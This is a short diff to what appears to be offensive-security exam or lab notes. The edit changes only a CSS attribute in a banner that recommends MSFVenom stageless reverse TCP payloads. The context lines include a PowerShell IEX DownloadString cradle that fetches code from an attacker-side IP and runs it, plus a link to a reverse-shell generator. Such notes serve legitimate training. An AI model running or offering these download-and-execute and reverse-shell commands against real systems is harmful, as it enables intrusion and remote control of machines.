@@ -9,4 +9,4 @@ echo -n "IEX(New-Object System.Net.WebClient).DownloadString('http://192.168.119
 ```
 Great site for generating shells.
 [Revshells.com](https://www.revshells.com/) 
-<hr style="border-color:red"><p style="color:red;text-align:center">If you use MSFVenom, always use the 4th option Windows Stageless Reverse TCP so you get full points</p><hr style="border-color:red">
+<hr style="border-color:red"><p style="color:red;align:center">If you use MSFVenom, always use the 4th option Windows Stageless Reverse TCP so you get full points</p><hr style="border-color:red">
